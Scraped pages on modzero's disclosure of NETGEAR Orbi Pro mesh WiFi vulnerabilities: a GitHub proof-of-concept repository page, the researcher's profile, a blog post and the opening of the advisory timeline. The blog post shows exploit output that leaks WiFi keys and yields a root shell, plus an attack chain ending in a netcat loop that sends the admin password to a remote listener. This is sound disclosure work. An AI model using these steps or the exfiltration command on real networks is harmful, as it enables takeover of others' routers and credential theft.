=== Content from github.com_c28e3c9b_20250119_121724.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmodzero%2FMZ-20-02-NETGEAR-Orbi-Security)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmodzero%2FMZ-20-02-NETGEAR-Orbi-Security)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=modzero%2FMZ-20-02-NETGEAR-Orbi-Security)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Apr 4, 2024. It is now read-only.

[modzero](/modzero)
/
**[MZ-20-02-NETGEAR-Orbi-Security](/modzero/MZ-20-02-NETGEAR-Orbi-Security)**
Public archive

* [Notifications](/login?return_to=%2Fmodzero%2FMZ-20-02-NETGEAR-Orbi-Security) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fmodzero%2FMZ-20-02-NETGEAR-Orbi-Security)
* [Star
   4](/login?return_to=%2Fmodzero%2FMZ-20-02-NETGEAR-Orbi-Security)

NETGEAR Orbi Pro Mesh WiFi System - Proof of Concept Exploits and additional information in security advisory MZ-20-02

### License

[View license](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/LICENSE)

[4
stars](/modzero/MZ-20-02-NETGEAR-Orbi-Security/stargazers) [0
forks](/modzero/MZ-20-02-NETGEAR-Orbi-Security/forks) [Branches](/modzero/MZ-20-02-NETGEAR-Orbi-Security/branches) [Tags](/modzero/MZ-20-02-NETGEAR-Orbi-Security/tags) [Activity](/modzero/MZ-20-02-NETGEAR-Orbi-Security/activity)
 [Star](/login?return_to=%2Fmodzero%2FMZ-20-02-NETGEAR-Orbi-Security)

 [Notifications](/login?return_to=%2Fmodzero%2FMZ-20-02-NETGEAR-Orbi-Security) You must be signed in to change notification settings

* [Code](/modzero/MZ-20-02-NETGEAR-Orbi-Security)
* [Issues
  0](/modzero/MZ-20-02-NETGEAR-Orbi-Security/issues)
* [Pull requests
  0](/modzero/MZ-20-02-NETGEAR-Orbi-Security/pulls)
* [Actions](/modzero/MZ-20-02-NETGEAR-Orbi-Security/actions)
* [Projects
  0](/modzero/MZ-20-02-NETGEAR-Orbi-Security/projects)
* [Security](/modzero/MZ-20-02-NETGEAR-Orbi-Security/security)
* [Insights](/modzero/MZ-20-02-NETGEAR-Orbi-Security/pulse)

Additional navigation options

* [Code](/modzero/MZ-20-02-NETGEAR-Orbi-Security)
* [Issues](/modzero/MZ-20-02-NETGEAR-Orbi-Security/issues)
* [Pull requests](/modzero/MZ-20-02-NETGEAR-Orbi-Security/pulls)
* [Actions](/modzero/MZ-20-02-NETGEAR-Orbi-Security/actions)
* [Projects](/modzero/MZ-20-02-NETGEAR-Orbi-Security/projects)
* [Security](/modzero/MZ-20-02-NETGEAR-Orbi-Security/security)
* [Insights](/modzero/MZ-20-02-NETGEAR-Orbi-Security/pulse)

# modzero/MZ-20-02-NETGEAR-Orbi-Security

    master[Branches](/modzero/MZ-20-02-NETGEAR-Orbi-Security/branches)[Tags](/modzero/MZ-20-02-NETGEAR-Orbi-Security/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[6 Commits](/modzero/MZ-20-02-NETGEAR-Orbi-Security/commits/master/) | | |
| [LICENSE](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/LICENSE "LICENSE") | | [LICENSE](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/README.md "README.md") | | [README.md](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/README.md "README.md") |  |  |
| [netgear.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/netgear.py "netgear.py") | | [netgear.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/netgear.py "netgear.py") |  |  |
| [orbiSatGatherInformation.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/orbiSatGatherInformation.py "orbiSatGatherInformation.py") | | [orbiSatGatherInformation.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/orbiSatGatherInformation.py "orbiSatGatherInformation.py") |  |  |
| [orbiSatGetShell.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/orbiSatGetShell.py "orbiSatGetShell.py") | | [orbiSatGetShell.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/orbiSatGetShell.py "orbiSatGetShell.py") |  |  |
| [orbiSatSoapQuery.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/orbiSatSoapQuery.py "orbiSatSoapQuery.py") | | [orbiSatSoapQuery.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/orbiSatSoapQuery.py "orbiSatSoapQuery.py") |  |  |
| [orbiSatUpdateAdminPass.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/orbiSatUpdateAdminPass.py "orbiSatUpdateAdminPass.py") | | [orbiSatUpdateAdminPass.py](/modzero/MZ-20-02-NETGEAR-Orbi-Security/blob/master/orbiSatUpdateAdminPass.py "orbiSatUpdateAdminPass.py") |  |  |
| View all files | | |

## Repository files navigation

* README
* License
# MZ-20-02-NETGEAR-Orbi-Security

NETGEAR Orbi Pro Mesh WiFi System - Proof of Concept Exploits and additional information in security advisory MZ-20-02

## General Information

A detailed security advisory is available at <https://www.modzero.com/advisories/MZ-20-02-Netgear-Orbi-Pro-Security.txt>
A screencast video of the setup and Proof-of-Concept exploit is available here: <https://youtu.be/bCJMCuiCbr4>

## CVE IDs

CVE-2020-11549, CVE-2020-11550, CVE-2020-11551

## Contact

Author of MZ-20-02, its PoC exploits and tools is Thorsten Schroeder (<https://github.com/devio>). If you have any questions, don't hesitate to contact me directly.
This software is released under the Beer-Ware-License (see below).

* [Thorsten Schroeder @ twitter](https://twitter.com/__ths__ "ths on twitter")
* [modzero home](https://www.modzero.com "modzero")
* [modzero @ twitter](https://twitter.com/mod0 "modzero on twitter")
* [modzero @ github](https://github.com/modzero/ "modzero on github")

## License

```
Copyright (c) 2020, modzero AG, Thorsten Schroeder <ths@modzero.ch>

All rights reserved.

 This file is part of the NETGEAR Orbi Pro Security Advisory MZ-20-02 / PoC.

 "THE BEER-WARE LICENSE" (Revision 42):
 Thorsten Schroeder wrote this file. As long as you
 retain this notice you can do whatever you want with this stuff. If we meet
 some day, and you think this stuff is worth it, you can buy me a beer in
 return. Thorsten Schroeder.

 NON-MILITARY-USAGE CLAUSE
 Redistribution and use in source and binary form for military use and
 military research is not permitted. Infringement of these clauses may
 result in publishing the source code of the utilizing applications and
 libraries to the public. As this software is developed, tested and
 reviewed by *international* volunteers, this clause shall not be refused
 due to the matter of *national* security concerns.

 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 ARE DISCLAIMED. IN NO EVENT SHALL THE DDK PROJECT BE LIABLE FOR ANY DIRECT,
 INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

```

## About

NETGEAR Orbi Pro Mesh WiFi System - Proof of Concept Exploits and additional information in security advisory MZ-20-02

### Resources

[Readme](#readme-ov-file)
### License

[View license](#License-1-ov-file)

[Activity](/modzero/MZ-20-02-NETGEAR-Orbi-Security/activity)
[Custom properties](/modzero/MZ-20-02-NETGEAR-Orbi-Security/custom-properties)
### Stars

[**4**
stars](/modzero/MZ-20-02-NETGEAR-Orbi-Security/stargazers)
### Watchers

[**5**
watching](/modzero/MZ-20-02-NETGEAR-Orbi-Security/watchers)
### Forks

[**0**
forks](/modzero/MZ-20-02-NETGEAR-Orbi-Security/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmodzero%2FMZ-20-02-NETGEAR-Orbi-Security&report=modzero+%28user%29)

## [Releases](/modzero/MZ-20-02-NETGEAR-Orbi-Security/releases)

No releases published

## [Packages 0](/orgs/modzero/packages?repo_name=MZ-20-02-NETGEAR-Orbi-Security)

No packages published

## Languages

* [Python
  100.0%](/modzero/MZ-20-02-NETGEAR-Orbi-Security/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e80c1eb6_20250119_135718.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdevio)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdevio)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@devio](https://avatars.githubusercontent.com/u/569477?s=64&v=4)

**devio**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fdevio)

[Overview](/devio)
[Repositories
14](/devio?tab=repositories)
[Projects
0](/devio?tab=projects)
[Packages
0](/devio?tab=packages)
[Stars
26](/devio?tab=stars)

More

* [Overview](/devio)
* [Repositories](/devio?tab=repositories)
* [Projects](/devio?tab=projects)
* [Packages](/devio?tab=packages)
* [Stars](/devio?tab=stars)

![@devio](https://avatars.githubusercontent.com/u/569477?s=64&v=4)

**devio**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fdevio)

[![View devio's full-sized avatar](https://avatars.githubusercontent.com/u/569477?v=4)](https://avatars.githubusercontent.com/u/569477?v=4)

# Thorsten Schröder devio

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fdevio)

[202
followers](https://github.com/devio?tab=followers) · [23
following](https://github.com/devio?tab=following)

* modzero
* Hamburg
* <https://www.modzero.com>
* Mastodon

  [@ths@23.social](https://23.social/%40ths)
* <https://bsky.app/profile/ths.ch>

## [Achievements](/devio?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x2](/devio?achievement=starstruck&tab=achievements)
## [Achievements](/devio?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x2](/devio?achievement=starstruck&tab=achievements)
## Organizations

[![@modzero](https://avatars.githubusercontent.com/u/2931083?s=64&v=4)](/modzero) [![@ddk](https://avatars.githubusercontent.com/u/3319589?s=64&v=4)](/ddk)

Block or Report

# Block or report devio

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user’s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=devio+%28user%29)

[Overview](/devio)
[Repositories
14](/devio?tab=repositories)
[Projects
0](/devio?tab=projects)
[Packages
0](/devio?tab=packages)
[Stars
26](/devio?tab=stars)

More

* [Overview](/devio)
* [Repositories](/devio?tab=repositories)
* [Projects](/devio?tab=projects)
* [Packages](/devio?tab=packages)
* [Stars](/devio?tab=stars)

## Popular repositories Loading

1. [Walruss](/devio/Walruss) Walruss
   Public

   PC-Wahl 10 Hacking Tools

   C

   [290](/devio/Walruss/stargazers)
   [25](/devio/Walruss/forks)
2. [mod0keecrack](/devio/mod0keecrack) mod0keecrack
   Public

   KeePass 2 database master-password cracker

   C

   [130](/devio/mod0keecrack/stargazers)
   [21](/devio/mod0keecrack/forks)
3. [FinSpy-Tools](/devio/FinSpy-Tools) FinSpy-Tools
   Public

   Tools for the analysis of FinSpy/FinFisher components #spyware #trojan #govware

   Python

   [95](/devio/FinSpy-Tools/stargazers)
   [6](/devio/FinSpy-Tools/forks)
4. [de-x](/devio/de-x) de-x
   Public

   Delete the whole history of your tweets, retweets and replies w/o API access

   Python

   [46](/devio/de-x/stargazers)
   [4](/devio/de-x/forks)
5. [lpcflash](/devio/lpcflash) lpcflash
   Public

   flash utility for NXP LPC17xx ARM CM3 series on-chip bootloader

   C

   [32](/devio/lpcflash/stargazers)
   [13](/devio/lpcflash/forks)
6. [MgSieve](/devio/MgSieve) MgSieve
   Public

   A .Net ManageSieve Client and Library according to RFC5804

   C#

   [4](/devio/MgSieve/stargazers)
   [1](/devio/MgSieve/forks)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.modzero.com_7e903bab_20250119_121726.html ===

# [mod%log](../../../../../index.html)

modzero AG

[Main](../../../../../index.html) >
[Archives](../../../../../archives/index.html) >
[2020](../../../../../archives/2020/index.html) >

[05](../../../../../archives/2020/05/index.html) >

[<](../../../../../archives/2020/04/17/deserialization_attacks_in__net_games/index.html)

13:37:42
[>](../../../../../archives/2020/06/16/mz-20-03_-_new_security_advisory_regarding_vulnerabilities_in__net/index.html)
## 2020-05-18

### How Netgear meshed(\*) up WiFi for Business

(\*) I'm really sorry for the pun line.

![](/static/netgear-orbi/squirrel.jpg)

One day in December, I decided to actually *build* something. Something more or less useful. So, I paused breaking stuff (I *really* did) to create something that could help enhance the security-level of WiFi networks. I failed.

When I set out to build the thing I mentioned above, it also involved taking a closer look at our recently acquired [Netgear Orbi Pro WiFi Mesh](https://www.netgear.com/orbi-pro/) system.

And when I say take a closer look I mean: I had to figure out how to use *public APIs that are not supposed to be public*. In this particular case, the public API is a SOAP interface, available on the local network (not the Internet).

*Public APIs that are not supposed to be public* are defined by three attributes:

1. they are public
2. they are undocumented
3. they are still public

However, accessing interesting parts of the APIs requires authentication against the SOAP Web application running on each Netgear Orbi Pro Mesh device. When I tried to figure out how Netgear implemented Machine-to-Machine (M2M) authentication between Router/Access Point and Mesh-Satellites, [I accidentally](https://knowyourmeme.com/memes/i-accidentally) the whole network-confidentiality and -integrity.

But first, let's have a short introduction to this Orbi Pro Mesh WiFi thing:
## The Netgear Orbi Pro WiFi Mesh network

The Netgear Orbi Pro Mesh WiFi system can provide a large coverage of WiFi signal over a large area within buildings, halls, and outdoors. Up to four separated 2.4GHz and 5GHz networks can be set up for different purposes:

1. [Wireless 1] Main network with administrative access
2. [Wireless 2] Employee network with limited access to admin interfaces
3. [Wireless 3] Separate IoT/employee network
4. [Guest] Unencrypted guest network with "Guest Portal"

The satellites are connected to the WiFi Router/Access-Point using a mesh network:

![Orbi_DaisyChain](/static/netgear-orbi/orbimesh.png)

Fig.1 - Source: https://www.netgear.at/landings/mesh-network/images/Orbi\_DaisyChain.png

This allows distribution of your WiFi network signal evenly across your property, building, hall and whatnot. This is fine. Really! Until you decide to spend less resources on security-architecture and cryptography.

## So what went wrong...?

![](/static/netgear-orbi/thisisfine.jpg)

## Impact

It's kind of a chain reaction. The ability to "guess" authentication parameters like username/password to access Netgear Orbi WiFi Mesh nodes with admin privileges via SOAP API, is something that can be exploited to gather sensitive information (cleartext passwords, etc.)

Using these "credentials", any (\*) network participant is able to read and write configuration parameters for a particular Mesh-node.

(\*) attacker must be on wired network or Orbi WiFi 1. However, if WiFi 2 is allowed to access network nodes in LAN (e.g. printers, etc. - which is likely in business setups), the attacker could also be on WiFi 2.

Reading and writing Netgear Orbi Pro Mesh parameters lead to Remote Code Execution (RCE) on the Mesh-satellites and subsequently to administrative access to the Router/Access Point and eventually the whole network.

As the curious reader might have noticed, all information that is needed to deduce the "password" is available to any user in the local network.

## Exploitation

We have uploaded a video to YouTube for documentation:

The video shows the whole setup process of an AP-Mode setup using Mesh-nodes, up until its exploitation ([see minute 10:40](https://www.youtube.com/watch?v=bCJMCuiCbr4&t=640s)) using our scripts available at <https://github.com/modzero/MZ-20-02-NETGEAR-Orbi-Security>.

````

 $ python3 orbiSatGetShell.py 10.11.42.243 asdfasdf
[0] 169.254.222.20  : dc:71:[REDACTED] (eth1)
[1] 192.168.56.1    : 0a:00:[REDACTED] (eth2)
[...]
[7] 10.11.42.149    : dc:71:[REDACTED] (wifi0)
[...]
[+] Select Interface: 7
[*] Query Orbi Satellite at 10.11.42.243 via local interface dc:71:[REDACTED]
[*] Device details for 10.11.42.243
[-] Device Name:      sat-wkcdv
[-] Serial Number:    5836[REDACTED]
[-] Firmware Version: V2.5.0.108

[*] Administrative WLAN
[-]    ssid: skynet
[-]    mode: WPA2-PSK
[-]    psk:  i-1X[REDACTED]

[*] Guest WLAN
[-]    ssid: darknet
[-]    mode: WPA2-PSK
[-]    psk:  NewP[REDACTED]

[*] Enable telnet <0v0>
[e] Error getting session/timestamp from satellite: 401 (Unauthorized)!
[-] new session/timestamp: 569478051
[-] Success!

  —————
  R U N
  C M D
  —————

root@SRS60:/# id
id
uid=0(root) gid=0(root) groups=0(root)

````

Using these exploits, you can gain root access on any Orbi Mesh satellite. Of course, it can be tedious to pwn every single satellite one by one. Instead, let's just get the central Orbi AP/Router root password, which is conveniently available on each satellite:

1. Change admin password of Netgear Orbi Mesh satellite.
2. Enable telnet access on satellite.
3. Login as root via telnet.
4. Get original root/admin password of the whole Netgear Orbi WiFi Mesh network:
   ````

   while [ 1 ]; do config show | grep http_passwd | nc  6666; sleep 5; done &

   ````

**Why?** Netgear decided to sync the AP/Router config to satellites periodically. In clear-text via HTTP. This means: Waiting for the original admin password to be synced from AP/Router to satellites is a matter of minutes.

## Conclusion

There are quite a few bonus levels and easter eggs hidden in Netgear's WiFi Mesh implementation. We found some, and wrote them down [in more detail here](https://www.modzero.com/advisories/MZ-20-02-Netgear-Orbi-Pro-Security.txt). I'm confident that this is only the tip of an iceberg. The [current fix implemented by Netgear on April 25th](https://kb.netgear.com/000061851/SRR60-Firmware-Version-2-5-2-104)  actually prevents me from pwning the system within minutes, but it does not prevent an attacker from pwning it within days or weeks. By merely hiding a new or additional authentication method, Netgear did not fix the root of all evil: the basic stuff.

As of May, 18th 2020, Netgear did not implement well-established cryptographic methods to ensure the confidentiality, authenticity and integrity of their business/pro wireless network configuration.

## !Shouts

If you participate in Netgear's bug bounty program, you are prohibited from publicly disclosing vulnerabilities. This is wrong and against the interest of Netgear's own customers.

I encourage you not to participate in their bug bounty program until this is fixed.

As you can see in the [timeline of our advisory](https://www.modzero.com/advisories/MZ-20-02-Netgear-Orbi-Pro-Security.txt), Netgear does not care to give you any feedback about your disclosure. Instead, like in our case, they silently pushed updates without notifying us. Also, the vulnerabilities were not even mentioned in their firmware release notes for [SRR60](https://kb.netgear.com/000061851/SRR60-Firmware-Version-2-5-2-104) or [SRS60](https://kb.netgear.com/000061852/SRS60-Firmware-Version-2-5-2-104).

Needless to say, we were never mentioned, let alone thanked, either.

Posted by Thorsten SchrÃ¶der
| [Permanent link](../../../../../archives/2020/05/18/how_netgear_meshed_up_wifi_for_business/index.html)

[/\](#top)



=== Content from www.modzero.com_175b7657_20250119_135717.html ===

------------------------------------------------------------------v1-
modzero Security Advisory [MZ-20-02]:
Critical Vulnerabilities in NETGEAR Orbi Pro WiFi Mesh System
---------------------------------------------------------------------
---------------------------------------------------------------------
1. Timeline
---------------------------------------------------------------------
\* 2020-01-14: Initial contact with Netgear PSIRT, PGP key exchange.
\* 2020-01-17: Advisory (draft) submitted to Netgear PSIRT along with
fully working exploits written in python.
\* 2020-01-22: Asking for confirmation.
\* 2020-01-23: NETGEAR asks for instructions on how to exploit.
\* 2020-01-23: NETGEAR asks for help with error "OSError: [Errno 113]
No route to host"
\* 2020-01-23: modzero suggests to check for proper routes to target.
\* 2020-01-24: NETGEAR confirmed they're able to successfully send
ICMP messages to target, but still have problems with
authentication.
\* 2020-01-24: modzero tries to remote-debug issues by asking several
questions about NETGEAR test-lab setup.
\* 2020-01-25: NETGEAR asks for exploits (python-scripts) with more
debugging.
\* 2020-01-27: modzero offers to help with debugging and asks for a
config-backup/config show output.
\* 2020-01-29: NETGEAR sends configuration data, that totally differs
from what have been sent on 2020-01-25.
\* 2020-01-29: NETGEAR confirmed, they have not proceeded according to
our advisory, asking for next steps. (???)
\* 2020-01-29: modzero suggests talking to devs and security archi-
tects, if previously made decisions still meet their
current security requirements.
\* 2020-01-30: modzero received notice, that the engineering team "is
in China and they are on holidays now". NETGEAR will
get back to modzero by mid next week.
\* 2020-03-03: modzero asks for progress. Current/Updated firmware
is still vulnerable.
\* 2020-03-04: NETGEAR struggles to meet their ETA due to COVID-19.
They let us now to keep us updated, once they've a fix
in place.
\* 2020-04-02: modzero sends screencast-video "from unboxing to root"
to demonstrate actual setup and exploitation with most
recent firmware.
\* 2020-04-05: The following CVE-IDs have been assigned to these
vulnerabilities: CVE-2020-11549, CVE-2020-11550 and
CVE-2020-11551.
\* 2020-04-06: NETGEAR provides new firmware images for testing.
modzero offers to extend release time by 2-4 weeks to
ensure proper testing and roll-out of the patches, due
to the Corona pandemic.
\* 2020-04-13: Publication delayed to May 18th
\* 2020-??-??: NETGEAR silently published updated firmware without
sending a notification to modzero.
\* 2020-05-10: Review of latest Firmware: Exploits does not work
anymore. However, authentication mechanism is still the
same.
\* 2020-05-11: modzero sends results of the patch-review, asking for
some details of certain bugfixes. Never got an answer
from NETGEAR...
\* 2020-05-18: Advisory and full details published.
---------------------------------------------------------------------
2. Summary
---------------------------------------------------------------------
Vendor: NETGEAR
Homepage: https://www.netgear.com/
Products known to be affected:
- Orbi Pro Tri-Band Business WiFi Router (SRR60) AC3000
- Orbi Pro Tri-Band Business WiFi Add-on Satellite (SRS60) AC3000
- Orbi Outdoor Satellite (RBS50Y)
= Orbi Firmware Version <= V2.5.2.104
NETGEAR PSIRT asked for an extension of the public release by 4 weeks,
because they identified these vulnerabilities in other products
as well. NETGEAR didn't provide any information on further affected
products or devices.
\* 2.1 Weak authentication on administrative SOAP interface on Orbi Pro
Wifi Mesh Satellites
\* 2.1.1 CVE-2020-11551
[unauthenticated] Remote write of arbitrary WiFi configuration data
such as authentication details, network settings, DNS, system
administration interface configuration, etc.
Score:
Unauthenticated, remote read/write of Wifi system configuration data
modzero: CVSS:3.1 AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H -> 9.6
URL: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?
vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N&version=3.1
\* 2.1.2 CVE-2020-11550
[unauthenticated] Remote leak of sensitive/arbitrary information, such
as SSIDs and Pre-Shared-Keys (PSK) of all configured WiFis without any
prior knowledge.
Score:
